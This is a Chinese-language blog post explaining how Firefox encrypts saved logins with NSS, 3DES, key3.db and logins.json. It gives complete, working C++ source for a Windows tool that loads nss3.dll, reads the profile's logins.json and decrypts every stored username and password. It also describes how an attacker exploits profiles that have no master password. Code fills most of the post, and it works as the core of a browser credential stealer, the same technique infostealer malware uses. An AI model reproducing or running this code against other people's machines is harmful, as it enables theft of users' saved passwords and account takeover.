---
title: Firefox browser login information extraction and decryption
tags: C++ Firefox Decrypt VS2019
edit: 2019-07-18
categories: C++ Technology
status: Completed
description: Extract and decrypt the login information (URL, username, password) automatically saved by Firefox based on C++
---

# Firefox加密原理

为满足开发者创建满足各种安全标准的应用程序，Mozilla开发了一个叫做[“Network Security Services”](https://developer.mozilla.org/en-US/docs/NSS),或叫NSS的开源库。Firefox使用其中一个叫做”Security Decoder Ring”，或叫SDR的API来帮助实现账号证书的加密和解密函数。

Firefox是如何使用它完成加密的:

当一个Firefox配置文件被首次创建时，一个叫做SDR的随机key和一个Salt(**注**：Salt， 在密码学中，是指通过在密码任意固定位置插入特定的字符串，让散列后的结果和使用原始密码的散列结果不相符，这种过程称之为“加盐”)就会被创建并存储在 一个名为“**key3.db**”的文件中。利用这个key和盐，使用3DES加密算法来加密用户名和密码。密文是Base64编码的，并存储在一个叫做“**logins.json**”的文件中。**logins.json**和**key3.db**文件均位于**%AppData\Roaming\Mozilla\Firefox\Profiles\\[random_profile]**目录下。

所以我们要做的就是得到SDR密钥。这个key被保存在一个叫PCKS#11软件“令牌”的容器**slot**中。该令牌被封装进入内部编号为PKCS#11的“槽位”中。因此需要访问该槽位来破译账户证书。

还有一个问题，这个SDR也是用3DES(DES-EDE-CBC)算法加密的。解密密钥是Mozilla叫做“主密码”的hash值，以及一个位于**key3.db**文件中对应的叫做“全局盐”的值。

Firefox用户可以在浏览器的设置中设定主密码，但关键是好多用户不知道这个特性。正如我们看到的，用户整个账号证书的完整性链条依赖于安全设置中选择的密码，它是攻击者唯一不知道的值。如果用户使用一个强健的主密码，那么攻击者想要恢复存储的证书是不太可能的。

那么如果用户没有设置主密码，空密码就会被使用。这意味着攻击者可以提取全局盐，获得它与空密码做hash运算结果，然后使用该结果破译SDR密钥。再用破译的SDR密钥危害用户证书。

该过程看起来就是这样：

<img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-17-Firefox%20browser%20login%20information%20extraction%20and%20decryption/assert/01.jpg" width="70%">

负责SDR解密的主要函数是**PK11SDR_Decrypt**。

参考资料：

[NSS reference](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Reference)

[PKCS11 Implement](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/PKCS11_Implement)

[NSS API Guidelines](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/NSS_API_GUIDELINES#NSS_API_Structure)

# C++ 程序实现

**注**：您可以使用此项目解密Firefox上保存的用户名和密码。代码在Firefox 67.0.4 (x64 zh-CN)上测试。如果您将使用Firefox x86上的代码，则必须使用x86编译代码，您还必须更改x86的程序文件路径。

## 头文件Firefox_decrypt.h

```c++
#pragma once
#ifndef _FirefoxDecrypt_
#define _FirefoxDecrypt_
#include<iostream>
#include <Windows.h>
#include <string>
using std::string;

// Structs and typedefs
typedef enum {
	siBuffer,
	siClearDataBuffer,
	siCipherDataBuffer,
	siDERCertBuffer,
	siEncodedCertBuffer,
	siDERNameBuffer,
	siEncodedNameBuffer,
	siAsciiNameString,
	siAsciiString,
	siDEROID
} SECItemType;

typedef struct SECItemStr SECItem;

struct SECItemStr {
	SECItemType type;
	unsigned char* data;
	unsigned int len;
};

typedef enum _SECStatus {
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
} SECStatus;

typedef unsigned int PRUint32;// For PL_Base64Decode
typedef void PK11SlotInfo; // For PK11_Authenticate
typedef int PRBool; // For PK11_Authenticate

typedef SECStatus(*fpNSS_Init)(const char* configdir);
typedef char* (*fpPL_Base64Decode)(const char* src, PRUint32 srclen, char* dest);
typedef SECStatus(*fpPK11SDR_Decrypt)(SECItem* data, SECItem* result, void* cx);
typedef SECStatus(*fpPK11_Authenticate)(PK11SlotInfo* slot, PRBool loadCerts, void* wincx);
typedef PK11SlotInfo* (*fpPK11_GetInternalKeySlot)();
typedef void (*fpPK11_FreeSlot)(PK11SlotInfo* slot);
typedef SECStatus(*fpNSS_Shutdown)();

// 全局变量
extern fpNSS_Init NSS_Init;
extern fpPL_Base64Decode PL_Base64Decode;
extern fpPK11SDR_Decrypt PK11SDR_Decrypt;
extern fpPK11_Authenticate PK11_Authenticate;
extern fpPK11_GetInternalKeySlot PK11_GetInternalKeySlot;
extern fpPK11_FreeSlot PK11_FreeSlot;
extern fpNSS_Shutdown NSS_Shutdown;

// Functions
string getInstallationPath();
HMODULE loadLibrary(string installationPath);
void dllFunction(HMODULE lib);
string getProfilePath();
char* getBuffer(string profilePath);
unsigned char* decrypt(string encryptedString);
size_t charCount(const char* str, size_t size, const char ch);
char* U2G(const char* utf8);

#endif // !_FirefoxDecrypt_
```

**SECItem**:A structure that points to other structures.A `SECItem` structure can be used to associate your own data with an SSL socket.(指向其他结构的结构。一个`SECItem`结构可以用于自己的数据与SSL套接字关联。)

**SECStatus**:The return value for many SSL functions.(许多SSL函数的返回值。)

**PK11SlotInfo**:An opaque structure representing a physical or logical PKCS #11 slot.(表示物理或逻辑PKCS＃11插槽的不透明结构。)





## 获取Firefox安装路径模块（InstallatonPath_Get.cpp）

```c++
#include"Firefox_decrypt.h"
#define MY_BUFSIZE 128 // Arbitrary initial value.
// Dynamic allocation will be used.
constexpr auto Get_failed = "get_InstallationPath Failed";
// 通过注册表获取软件的安装路径
string getInstallationPath(){
	HKEY hKey;
	TCHAR szProductType[MY_BUFSIZE];
	DWORD dwBufLen = MY_BUFSIZE;
	LONG lRet;
	// 下面是打开注册表, 只有打开后才能做其他操作
	lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, // 要打开的根键
		TEXT("SOFTWARE\\Mozilla\\Mozilla Firefox\\67.0.4 (x64 zh-CN)\\Main"), // 要打开的子子键（火狐版本67.0.4 (x64 zh-CN)）
		0, // 这个一定要为0
		KEY_QUERY_VALUE,	// 指定打开方式,此为读
		//KEY_QUERY_VALUE|KEY_WOW64_64KEY, // 32位程序非要获取64位的注册表需要在打开键时，添加参数KEY_WOW64_64KEY
		&hKey); // 用来返回句柄
	if (lRet == ERROR_SUCCESS) // 判断是否打开成功
	{
		// 打开注册表成功
		// 开始查询
		lRet = RegQueryValueEx(hKey, // 打开注册表时返回的句柄
			TEXT("Install Directory"), //要查询的名称,火狐安装目录记录在这里
			NULL, // 一定为NULL或者0
			NULL,
			(LPBYTE)szProductType, // 我们要的东西放在这里
			&dwBufLen);
		if (lRet == ERROR_SUCCESS) // 判断是否查询成功
		{
			RegCloseKey(hKey);
			return (char*)szProductType;
		}
		else
		{
			printf("获得安装目录失败\n");
			return Get_failed;
		}
	}
	else {
		printf("打开注册表失败\n");
		return Get_failed;
	}
}
```

通过注册表获得安装路径。[参考](https://www.shangzg.top/c++/technology/C++-Get-the-software-installation-path-through-the-registry.html)





## 动态加载库模块（Library_Load.cpp）

```c++
#include"Firefox_decrypt.h"
// 动态加载库文件 
HMODULE loadLibrary(string installationPath) {
	const char nssLibraryName[] = "nss3.dll";	// 加载动态链接库文件nss.dll
	SetCurrentDirectory(installationPath.c_str());	// 切换到nss.dll文件所在目录

	HMODULE nssLib = LoadLibrary(nssLibraryName);	// 加载nss.dll文件
	if (nssLib == NULL) {	// 模块句柄返回为空，动态加载失败
		printf("Library couldnt loaded!.. %d\n", GetLastError());
	}
	return	nssLib;	// 返回模块句柄
}
```





## 获取库方法模块（DLL_Function.cpp）

```c++
#include"Firefox_decrypt.h"
// Global Functions
fpNSS_Init NSS_Init;
fpPL_Base64Decode PL_Base64Decode;
fpPK11SDR_Decrypt PK11SDR_Decrypt;
fpPK11_Authenticate PK11_Authenticate;
fpPK11_GetInternalKeySlot PK11_GetInternalKeySlot;
fpPK11_FreeSlot PK11_FreeSlot;
fpNSS_Shutdown NSS_Shutdown;
void dllFunction(HMODULE lib) {
	// 通过模块句柄，GetProcAddress函数检索指定的动态链接库(DLL)中的输出库函数地址。
	NSS_Init = (fpNSS_Init)GetProcAddress(lib, "NSS_Init");	// 初始化
	PL_Base64Decode = (fpPL_Base64Decode)GetProcAddress(lib, "PL_Base64Decode");	// Base64解码
	PK11SDR_Decrypt = (fpPK11SDR_Decrypt)GetProcAddress(lib, "PK11SDR_Decrypt");	// SDR解密
	PK11_Authenticate = (fpPK11_Authenticate)GetProcAddress(lib, "PK11_Authenticate");	// 使用主密码对slot鉴权
	PK11_GetInternalKeySlot = (fpPK11_GetInternalKeySlot)GetProcAddress(lib, "PK11_GetInternalKeySlot");	// 得到内部key槽
	PK11_FreeSlot = (fpPK11_FreeSlot)GetProcAddress(lib, "PK11_FreeSlot");	// 释放获得的key槽
	NSS_Shutdown = (fpNSS_Shutdown)GetProcAddress(lib, "NSS_Shutdown");	// 关闭
}
```

**GetProcAddress**：

GetProcAddress函数检索指定的动态链接库(DLL)中的输出库函数地址。

**函数原型**：

```c++
FARPROC GetProcAddress(
  HMODULE hModule,    // DLL模块句柄
  LPCSTR lpProcName   // 函数名
);
```

**参数**：
**hModule **:包含此函数的DLL模块的句柄。LoadLibrary或者GetModuleHandle函数可以返回此句柄。
**lpProcName**: 包含函数名的以NULL结尾的字符串，或者指定函数的序数值。如果此参数是一个序数值，它必须在一个字的底字节，高字节必须为0。

**返回值**：
  如果函数调用成功，返回值是DLL中的输出函数地址。
  如果函数调用失败，返回值是NULL。得到进一步的错误信息，调用函数GetLastError。

**注释**：
  GetProcAddress函数被用来检索在DLL中的输出函数地址。 
  lpProcName指针指向的函数名，拼写和大小写必须和DLL源代码中的模块定义文件(.DEF)中输出段(EXPORTS)中指定的相同。Win32 API函数的输出名可能不同于你在代码中调用的这些函数名，这个不同被宏隐含在相关的SDK头文件中。如果想得到更多信息，请参考Win32函数原型(Win32 Function Prototypes)。 
  lpProcName参数能够识别DLL中的函数，通过指定一个与函数相联系的序数值(在.DEF中的EXPORTS段)。GetProcAddress函数验证那个指定的序数值是否在输出的序数1和最高序数值之间(在.DEF中)。函数用这个序数值作为索引从函数表中读函数地址，假如.DEF 文件不连续地定义函数的序数值，如从1到N(N是输出的函数序数值)，错误将会发生，GetProcAddress将会返回一个错误的、非空的地址，虽然指定的序数没有对应的函数。
  为了防止函数不存在，函数应该通过名字指定而不是序数值。  

**NSS_Init**：初始化NSS函数；

**PL_Base64Decode**：Base64解码函数；

**PK11SDR_Decrypt**：SDR解密函数；

**PK11_Authenticate**：slot授权函数；

**PK11_GetInternalKeySlot**：获得内部key槽函数；

**PK11_FreeSlot**：释放key槽函数；

**NSS_Shutdown**：关闭NSS函数；





## 获取保存登录信息文件路径模块（ProfilePath_Get.cpp）

```c++
#include"Firefox_decrypt.h"
#include <ShlObj_core.h>
constexpr auto Get_failed = "get_ProfilePath Failed";
string getProfilePath() {
	char* appDataPath = (char*)malloc(sizeof(char) * MAX_PATH);
	if (appDataPath != NULL) {
		SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);	// 获取当前用户的文件系统目录C:\Users\username\AppData\Roaming（CSIDL_APPDATA默认为AppData下的Roaming）
		string profileName = "";
		string sAppDataPath = appDataPath;
		//printf("%s\n", appDataPath);
		sAppDataPath = sAppDataPath + "\\Mozilla\\Firefox\\Profiles\\";	// Firefox的profiles路径
		WIN32_FIND_DATA ffd;	// WIN32_FIND_DATA包含文件的属性信息
		HANDLE hFind = FindFirstFile((sAppDataPath + "\\*").c_str(), &ffd);	// 根据文件名查找文件，成功返回一个句柄
		do {
			if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {	// dwFileAttributes是目标文件标记，&表示做与运算，FILE_ATTRIBUTE_DIRECTORY是文件夹的标志符，这句if的功能就是判断目标文件是否为文件夹
				string str = ffd.cFileName;

				if (str.find("release") != str.npos) {	// profiles下带有release的文件夹即为包含logins.json的文件夹，如845f4a08.default-release，安装时随机生成带有release名字的文件
					profileName = ffd.cFileName;
				}
			}
		} while (FindNextFile(hFind, &ffd) != 0);	// 遍历profiles文件夹
		//printf("appdata: %s\n", sAppDataPath.c_str());

		string profilePath = sAppDataPath + profileName;	// logins.json的路径
		return profilePath;
	}
	else
		return Get_failed;
}
	
```

**SHGetFolderPathA**：参考window开发文档[SHGetFolderPathA function](https://docs.microsoft.com/zh-cn/windows/win32/api/shlobj_core/nf-shlobj_core-shgetfolderpatha)





## 获取登录信息模块（Data_Get.cpp）

```c++
#include"Firefox_decrypt.h"
// 获取logins.json中保存的登录信息
char* getBuffer(string profilePath) {
	profilePath = profilePath + "\\logins.json";

	DWORD szBuffer = 100000, szWrotedBytes;
	char* buffer = (char*)malloc(szBuffer);
	HANDLE fLoginFile = CreateFileA(profilePath.c_str(), GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);	// 打开文件logins.json，成功返回句柄
	if (fLoginFile != INVALID_HANDLE_VALUE) {
		if(!(ReadFile(fLoginFile, buffer, szBuffer, &szWrotedBytes, NULL)))	// 读取内容到缓冲区
			printf("File read failed!..\n");
		//printf("%s,\n", buffer);
	}
	else {
		printf("File cannot found!..\n");
	}
	return buffer;
}
```

**CreateFileA**: 

Creates or opens a file or I/O device. The most commonly used I/O devices are as follows: file, file stream, directory, physical disk, volume, console buffer, tape drive, communications resource, mailslot, and pipe. The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified.

To perform this operation as a transacted operation, which results in a handle that can be used for transacted I/O, use the[**CreateFileTransacted**](http://msdn.microsoft.com/en-us/library/aa363859(v=VS.85).aspx) function.

主要用于打开一个文件或者是IO设备，最常用于打开一个IO设备，   

**函数原型：**　

**HANDLE CreateFile**(

　　LPCTSTR lpFileName, //指向文件名的指针

　　DWORD dwDesiredAccess, //访问模式（写/读）

　　DWORD dwShareMode, //共享模式

　　LPSECURITY_ATTRIBUTES lpSecurityAttributes, //指向安全属性的指针

　　DWORD dwCreationDisposition, //如何创建

　　DWORD dwFlagsAndAttributes, //文件属性

　　HANDLE hTemplateFile //用于复制文件句柄

　　);

　　**参数列表**

　　lpFileName String 要打开的文件的名字

　　dwDesiredAccess Long 如果为 GENERIC_READ 表示允许对设备进行读访问；如果为 GENERIC_WRITE 表示允许对设备进行写访问（可组合使用）；如果为零，表示只允许获取与一个设备有关的信息

　　dwShareMode Long， 零表示不共享； FILE_SHARE_READ 和/或 FILE_SHARE_WRITE 表示允许对文件进行共享访问

　　lpSecurityAttributes SECURITY_ATTRIBUTES， 指向一个SECURITY_ATTRIBUTES结构的指针，定义了文件的安全特性（如果操作系统支持的话）

　　**dwCreationDisposition Long**，下述常数之一：

　　CREATE_NEW 创建文件；如文件存在则会出错

　　CREATE_ALWAYS 创建文件，会改写前一个文件

　　OPEN_EXISTING 文件必须已经存在。由设备提出要求

　　OPEN_ALWAYS 如文件不存在则创建它

　　TRUNCATE_EXISTING 讲现有文件缩短为零长度

　　dwFlagsAndAttributes Long， 一个或多个下述常数

　　FILE_ATTRIBUTE_ARCHIVE 标记归档属性

　　FILE_ATTRIBUTE_COMPRESSED 将文件标记为已压缩，或者标记为文件在目录中的默认压缩方式

　　FILE_ATTRIBUTE_NORMAL 默认属性

　　FILE_ATTRIBUTE_HIDDEN 隐藏文件或目录

　　FILE_ATTRIBUTE_READONLY 文件为只读

　　FILE_ATTRIBUTE_SYSTEM 文件为系统文件

　　FILE_FLAG_WRITE_THROUGH 操作系统不得推迟对文件的写操作

　　FILE_FLAG_OVERLAPPED 允许对文件进行重叠操作

　　FILE_FLAG_NO_BUFFERING 禁止对文件进行缓冲处理。文件只能写入磁盘卷的扇区块

　　FILE_FLAG_RANDOM_ACCESS 针对随机访问对文件缓冲进行优化

　　FILE_FLAG_SEQUENTIAL_SCAN 针对连续访问对文件缓冲进行优化

　　FILE_FLAG_DELETE_ON_CLOSE 关闭了上一次打开的句柄后，将文件删除。特别适合临时文件

　　**也可在Windows NT下组合使用下述常数标记**：

　　SECURITY_ANONYMOUS， SECURITY_IDENTIFICATION， SECURITY_IMPERSONATION， SECURITY_DELEGATION， SECURITY_CONTEXT_TRACKING， SECURITY_EFFECTIVE_ONLY

　　hTemplateFile Long， 如果不为零，则指定一个文件句柄。新文件将从这个文件中复制扩展属性

**返回值**

　　如执行成功，则返回文件句柄。

　　INVALID_HANDLE_VALUE表示出错，会设置GetLastError。即使函数成功，但若文件存在，且指定了CREATE_ALWAYS 或 OPEN_ALWAYS，GetLastError也会设为ERROR_ALREADY_EXISTS





## 解密模块（Decrypt.cpp）

```c++
#include"Firefox_decrypt.h"
unsigned char* decrypt(string encryptedString) {
	// Base64解码
	size_t szDecoded = encryptedString.size() / 4 * 3 - charCount(encryptedString.c_str(), encryptedString.size(), '=');
	char* chDecoded = (char*)malloc(szDecoded + 1);
	//memset(chDecoded, NULL, szDecoded+1);

	SECItem encrypted, decrypted;
	decrypted.data = NULL;
	decrypted.len = NULL;
	encrypted.data = (unsigned char*)malloc(szDecoded + 1);
	encrypted.len = (unsigned int)szDecoded;
	//memset(encrypted.data, NULL, szDecoded + 1);
	
	// Firefox加密解码
	if (PL_Base64Decode(encryptedString.c_str(), (unsigned int)encryptedString.size(), chDecoded)&&(chDecoded!=NULL)&&(encrypted.data!=NULL)) {
		memcpy(encrypted.data, chDecoded, szDecoded);
		//printf("encrypted.data is :%s\n", encrypted.data);
		PK11SlotInfo* objSlot = PK11_GetInternalKeySlot();
		if (objSlot) {
			if (PK11_Authenticate(objSlot, TRUE, NULL) == SECSuccess) {
				SECStatus s = PK11SDR_Decrypt(&encrypted, &decrypted, nullptr);
				//printf("decrypted.data is :%s\n", decrypted.data);
			}
			else {
				printf("Auth err!\n");
			}
		}
		else {
			printf("OBJ err!\n");
		}
		PK11_FreeSlot(objSlot);
	}
	unsigned char* temp = (unsigned char*)malloc((_int64)decrypted.len + 1);
	if (temp != NULL) {
		temp[(_int64)decrypted.len] = NULL;
		memcpy(temp, decrypted.data, (__int64)decrypted.len);
	}
	return temp;
}
```

先进行Base64编码解码，再将解码后的加密信息进行解密。

Firefox解密时，先申请获得内部key槽slot，获得成功后，再进行Authenticate授权，授权成功后，调用PK11SDR_Decrypt进行解密。





## 辅助Base64解码模块（Char_Count.cpp）

```c++
// 获得Base64编码填充字符的数目
size_t charCount(const char* str, size_t size, const char ch) {
	size_t count = 0;
	for (size_t i = size - 1; i > size - 4; i--) {
		if (str[i] == ch)
			count++;
		else
			break;
	}
	return count;
}
```

Base64编码时在末尾填充 “=”。





## 字符转换模块（UTF8_Trans.cpp）

```c++
#include"Firefox_decrypt.h"
#pragma warning (disable:26451)
char* U2G(const char* utf8)//字符转换函数
{
	int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
	wchar_t* wstr = new wchar_t[len + 1];
	memset(wstr, 0, len + 1);
	MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wstr, len);
	len = WideCharToMultiByte(CP_ACP, 0, wstr, -1, NULL, 0, NULL, NULL);
	char* str = new char[len + 1];
	memset(str, 0, len + 1);
	WideCharToMultiByte(CP_ACP, 0, wstr, -1, str, len, NULL, NULL);
	if (wstr) delete[] wstr;
	return str;
}
```

如果用户名或密码中有中文字符，直接输出会产生乱码，需要进行转码之后输出，才能正确显示。





## 主模块（run.cpp）

```c++
#include"Firefox_decrypt.h"
#include<regex>

int main() {
	string installationPath = getInstallationPath();	// 获取Firefox的安装路径（通过注册表）
	HMODULE lib = loadLibrary(installationPath);	// 动态加载nss库(Network Security Services)(网络安全服务)，加载动态链接库文件nss.dll，返回模块句柄
	if (lib == NULL)	// 模块句柄为空，则动态加载失败
		return -1;
	dllFunction(lib);	// 获取nss库中等会需要用到的方法
	string profilePath = getProfilePath();	// 获取Firefox保存登录信息(用户名，密码)的文件logins.json的路径
	SECStatus s = NSS_Init(profilePath.c_str());	// 初始化NSS库
	if (s != SECSuccess) {
		printf("Error when initialization!\n");
	}
	string loginStrings = getBuffer(profilePath);	// 获取logins.json中保存的登录信息
	// 正则表达式匹配
	std::regex reHostname("\"hostname\":\"([^\"]+)\"");
	std::regex reUsername("\"encryptedUsername\":\"([^\"]+)\"");
	std::regex rePassword("\"encryptedPassword\":\"([^\"]+)\"");
	std::smatch match;
	string::const_iterator searchStart(loginStrings.cbegin());	// 循环迭代
	while (std::regex_search(searchStart, loginStrings.cend(), match, reHostname)) {
		printf("Host\t: %s \n", U2G(match.str(1).c_str()));
		std::regex_search(searchStart, loginStrings.cend(), match, reUsername);
		printf("Username: %s \n", U2G((const char*)decrypt(match.str(1))));	// decrypt用户名并转码输出
		std::regex_search(searchStart, loginStrings.cend(), match, rePassword);
		printf("Password: %s \n", U2G((const char*)decrypt(match.str(1))));	// decrypt密码并转码输出
		searchStart += match.position() + match.length();
		printf("-----------------------------------------\n");
	}
	NSS_Shutdown();	// 关闭NSS库
	//system("PAUSE");
	return 0;
}
```



# 运行测试

运行结果如下，程序执行正确。

<img src="https://raw.githubusercontent.com/Cr7-joker/Cr7-joker.github.io/master/_posts/2019-07-17-Firefox%20browser%20login%20information%20extraction%20and%20decryption/assert/02.png" width="70%">

# VS项目文件已上传至Github[Firefox_Decrypt](https://github.com/Cr7-joker/Firefox_Decrypt)